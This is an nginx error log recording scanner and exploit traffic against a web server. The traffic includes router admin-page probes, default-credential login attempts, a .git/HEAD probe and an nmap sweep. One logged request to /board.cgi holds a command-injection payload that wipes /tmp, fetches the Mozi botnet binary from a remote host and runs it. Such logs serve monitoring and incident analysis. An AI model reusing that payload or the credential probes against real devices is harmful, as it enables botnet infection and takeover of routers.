2025/02/11 23:20:28 [error] 21#21: *2 open() "/assets/boaform/admin/formLogin" failed (2: No such file or directory), client: 219.156.17.142, server: , request: "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0"
2025/02/12 20:00:42 [error] 19#19: *11 open() "/assets/logon.htm" failed (2: No such file or directory), client: 46.19.143.26, server: , request: "GET /logon.htm HTTP/1.1", host: "127.0.0.1"
2025/02/12 20:04:23 [error] 19#19: *15 open() "/assets/GponForm/diag_Form" failed (2: No such file or directory), client: 125.62.199.150, server: , request: "POST /GponForm/diag_Form?images/ HTTP/1.1", host: "127.0.0.1:8080"
2025/02/12 21:52:56 [error] 19#19: *19 open() "/assets/logon.htm" failed (2: No such file or directory), client: 46.19.143.26, server: , request: "GET /logon.htm HTTP/1.1", host: "127.0.0.1"
2025/02/12 23:01:34 [error] 20#20: *24 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 199.45.155.72, server: , request: "GET /favicon.ico HTTP/1.1", host: "193.93.76.135:8080"
2025/02/12 23:27:54 [error] 20#20: *30 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 167.94.145.106, server: , request: "GET /favicon.ico HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 00:30:16 [error] 20#20: *33 open() "/assets/GponForm/diag_Form" failed (2: No such file or directory), client: 124.235.200.120, server: , request: "POST /GponForm/diag_Form?images/ HTTP/1.1", host: "127.0.0.1:8080"
2025/02/13 03:13:28 [error] 21#21: *41 open() "/assets/boaform/admin/formLogin" failed (2: No such file or directory), client: 59.88.11.99, server: , request: "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0"
2025/02/13 03:42:08 [error] 21#21: *42 open() "/assets/GponForm/diag_Form" failed (2: No such file or directory), client: 27.47.3.218, server: , request: "POST /GponForm/diag_Form?images/ HTTP/1.1", host: "127.0.0.1:8080"
2025/02/13 03:58:25 [error] 21#21: *43 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 04:38:57 [error] 21#21: *44 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 04:46:50 [error] 21#21: *45 open() "/assets/board.cgi" failed (2: No such file or directory), client: 45.178.250.97, server: , request: "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://45.178.250.97:10127/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0"
2025/02/13 05:15:52 [error] 21#21: *47 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 05:58:26 [error] 21#21: *50 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 06:34:12 [error] 22#22: *56 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 206.168.34.77, server: , request: "GET /favicon.ico HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 06:35:29 [error] 22#22: *58 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 07:17:03 [error] 22#22: *61 open() "/assets/logon.htm" failed (2: No such file or directory), client: 46.19.143.26, server: , request: "GET /logon.htm HTTP/1.1", host: "127.0.0.1"
2025/02/13 07:19:30 [error] 22#22: *62 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 07:37:08 [error] 22#22: *63 open() "/assets/aaa9" failed (2: No such file or directory), client: 159.65.168.103, server: , request: "GET /aaa9 HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 07:37:29 [error] 22#22: *64 open() "/assets/aab8" failed (2: No such file or directory), client: 159.65.168.103, server: , request: "GET /aab8 HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 08:00:08 [error] 22#22: *67 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/13 08:25:06 [error] 19#19: *74 open() "/assets/sdk" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "POST /sdk HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:06 [error] 19#19: *76 open() "/assets/CSS/Miniweb.css" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /CSS/Miniweb.css HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:06 [error] 19#19: *78 open() "/assets/Portal0000.htm" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /Portal0000.htm HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:06 [error] 19#19: *77 open() "/assets/login.php" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /login.php HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:06 [error] 19#19: *79 open() "/assets/r51201,/desktop,/utility/flag.js" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /r51201%2C/desktop%2C/utility/flag.js HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:06 [error] 19#19: *80 open() "/assets/__Additional" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /__Additional HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:06 [error] 19#19: *84 open() "/assets/base.jhtml" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /base.jhtml HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:06 [error] 19#19: *83 open() "/assets/.git/HEAD" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /.git/HEAD HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:06 [error] 20#20: *85 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /favicon.ico HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:07 [error] 20#20: *86 open() "/assets/r51287,/desktop,/utility/flag.js" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /r51287%2C/desktop%2C/utility/flag.js HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:07 [error] 20#20: *89 open() "/assets/index.cfm" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /index.cfm HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:07 [error] 20#20: *90 open() "/assets/nmaplowercheck1739435106" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /nmaplowercheck1739435106 HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:07 [error] 20#20: *91 open() "/assets/webui" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /webui HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:07 [error] 21#21: *92 open() "/assets/localstart.cgi" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /localstart.cgi HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
2025/02/13 08:25:07 [error] 20#20: *94 open() "/assets/pools/default/buckets" failed (2: No such file or directory), client: 5.39.216.167, server: , request: "GET /pools/default/buckets HTTP/1.1", host: "FREE-193.93.76-135.onecom.com.ua:8080"
